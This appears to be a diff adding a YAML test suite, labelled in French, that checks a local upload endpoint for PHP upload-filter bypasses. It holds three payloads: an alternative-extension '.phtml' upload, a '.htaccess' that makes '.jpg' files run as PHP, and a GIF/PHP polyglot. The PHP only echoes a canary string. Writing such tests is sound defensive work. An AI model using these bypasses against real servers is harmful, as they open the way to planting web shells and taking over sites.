@@ -1,0 +1,55 @@
+name: "Upload — Contournements PHP (Extensions & HTAccess)"
+variables:
+  base_url: "http://localhost:8080"
+  canary: "MOWING_PHAR_{{rand_int}}"
+defaults:
+  read_timeout: 10
+  verify: false
+  follow_redirects: true
+
+tests:
+  - id: php-ext-phtml
+    name: "Upload d'extension alternative (.phtml / .php5)"
+    severity: high
+    request:
+      method: POST
+      path: "/upload"
+      multipart:
+        - name: "file"
+          filename: "shell.phtml"
+          content: "<?php echo 'MOWING_PHAR_SUCCESS'; ?>"
+          content_type: "application/octet-stream"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(upload.*success|shell\\.phtml|fichier.*reçu)"
+
+  - id: htaccess-exec
+    name: "Upload .htaccess pour forcer l'exécution PHP des images"
+    severity: critical
+    request:
+      method: POST
+      path: "/upload"
+      multipart:
+        - name: "file"
+          filename: ".htaccess"
+          content: "AddType application/x-httpd-php .jpg\nAddHandler application/x-httpd-php .jpg"
+          content_type: "text/plain"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(success|uploaded)"
+    # Note: À combiner ensuite avec un upload de 'test.jpg' contenant du code PHP.
+
+  - id: php-polyglot-gif
+    name: "Polyglotte GIF/PHP (Contournement de vérification magique)"
+    severity: high
+    request:
+      method: POST
+      path: "/upload"
+      multipart:
+        - name: "file"
+          filename: "image.php.gif"
+          content: "GIF89a;\x0D\x0A<?php echo 'MOWING_PHAR_SUCCESS'; ?>"
+          content_type: "image/gif"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(\\.php\\.gif|success)"
